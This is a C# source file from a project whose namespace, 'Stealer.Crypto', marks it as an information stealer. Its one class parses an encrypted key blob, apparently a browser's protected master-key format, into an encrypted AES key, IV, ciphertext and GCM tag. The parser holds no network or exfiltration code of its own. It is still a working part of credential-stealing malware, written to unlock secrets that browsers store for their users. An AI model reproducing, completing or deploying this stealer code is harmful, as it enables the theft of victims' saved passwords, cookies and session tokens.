using System;
using System.IO;

namespace Stealer.Crypto
{
    public static class ParseKeyBlob
    {
        public static BlobParsedData Parse(byte[] blobData)
        {
            using (MemoryStream memoryStream = new MemoryStream(blobData))
            {
                using (BinaryReader binaryReader = new BinaryReader(memoryStream))
                {
                    uint count = binaryReader.ReadUInt32();
                    binaryReader.ReadBytes((int)count);
                    uint num = binaryReader.ReadUInt32();
                    long position = memoryStream.Position;
                    byte[] iv = null;
                    byte[] ciphertext = null;
                    byte[] tag = null;
                    
                    if (num == 32U)
                    {
                        byte[] encryptedAesKey = binaryReader.ReadBytes(32);
                        return new BlobParsedData
                        {
                            Flag = 32,
                            Iv = iv,
                            Ciphertext = ciphertext,
                            Tag = tag,
                            EncryptedAesKey = encryptedAesKey
                        };
                    }
                    else
                    {
                        byte b = binaryReader.ReadByte();
                        byte b2 = b;
                        byte b3 = b2;
                        
                        if (b3 - 1 > 1)
                        {
                            if (b3 != 3 && b3 != 35)
                            {
                                throw new Exception();
                            }
                            byte[] encryptedAesKey = binaryReader.ReadBytes(32);
                            iv = binaryReader.ReadBytes(12);
                            ciphertext = binaryReader.ReadBytes(32);
                            tag = binaryReader.ReadBytes(16);
                            return new BlobParsedData
                            {
                                Flag = b,
                                Iv = iv,
                                Ciphertext = ciphertext,
                                Tag = tag,
                                EncryptedAesKey = encryptedAesKey
                            };
                        }
                        else
                        {
                            iv = binaryReader.ReadBytes(12);
                            ciphertext = binaryReader.ReadBytes(32);
                            tag = binaryReader.ReadBytes(16);
                            return new BlobParsedData
                            {
                                Flag = b,
                                Iv = iv,
                                Ciphertext = ciphertext,
                                Tag = tag,
                                EncryptedAesKey = null
                            };
                        }
                    }
                }
            }
        }
    }
}
